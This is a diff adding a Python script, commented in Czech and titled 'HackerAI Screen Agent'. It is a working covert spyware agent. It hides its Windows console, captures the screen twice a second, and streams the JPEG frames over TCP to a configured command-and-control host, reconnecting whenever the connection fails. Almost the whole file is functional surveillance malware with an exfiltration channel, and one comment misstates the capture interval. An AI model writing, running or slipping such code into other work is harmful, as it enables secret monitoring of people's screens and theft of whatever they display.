@@ -1,0 +1,99 @@
+#!/usr/bin/env python3
+"""
+HackerAI Screen Agent - bez perzistence (nestartuje s Windows).
+"""
+import os
+import sys
+import time
+import struct
+import socket
+import platform
+from io import BytesIO
+
+# ================ KONFIGURACE ================
+C2_HOST = "192.168.0.100"   # ← TVOJE IP
+C2_PORT = 4443
+INTERVAL = 0.5               # screenshot každých 0.1s
+QUALITY = 70                 # JPEG kvalita
+# =============================================
+
+
+def hide_console():
+    """Skryje konzoli na Windows."""
+    if platform.system() != "Windows":
+        return
+    try:
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except:
+        pass
+
+
+def take_screenshot():
+    """Pořídí screenshot pomocí MSS (fallback na PIL)."""
+    try:
+        from mss import mss
+        with mss() as sct:
+            monitor = sct.monitors[1]
+            sct_img = sct.grab(monitor)
+            from PIL import Image
+            img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
+    except ImportError:
+        try:
+            from PIL import ImageGrab
+            img = ImageGrab.grab(all_screens=True)
+        except ImportError:
+            print("[-] Nainstaluj: pip install mss pillow")
+            return None
+
+    buf = BytesIO()
+    img.save(buf, format="JPEG", quality=QUALITY, optimize=True)
+    return buf.getvalue()
+
+
+def send_frame(sock, frame_data):
+    """Pošle frame s délkovým prefixem."""
+    msg = struct.pack("!I", len(frame_data)) + frame_data
+    sock.sendall(msg)
+
+
+def connect_and_stream():
+    """Připojení na C2 a streamování."""
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((C2_HOST, C2_PORT))
+            print(f"[+] Připojeno k {C2_HOST}:{C2_PORT}")
+            sock.settimeout(None)
+
+            while True:
+                frame = take_screenshot()
+                if frame:
+                    try:
+                        send_frame(sock, frame)
+                    except (ConnectionResetError, BrokenPipeError):
+                        print("[-] Spojení ztraceno, znovu připojuji...")
+                        break
+                time.sleep(INTERVAL)
+
+        except (socket.timeout, ConnectionRefusedError, OSError) as e:
+            print(f"[-] Připojení selhalo ({e}), zkouším znovu za 5s...")
+            time.sleep(5)
+        except KeyboardInterrupt:
+            print("\n[!] Agent ukončen")
+            sys.exit(0)
+        finally:
+            try:
+                sock.close()
+            except:
+                pass
+
+
+def main():
+    hide_console()
+    connect_and_stream()
+
+
+if __name__ == "__main__":
+    main()
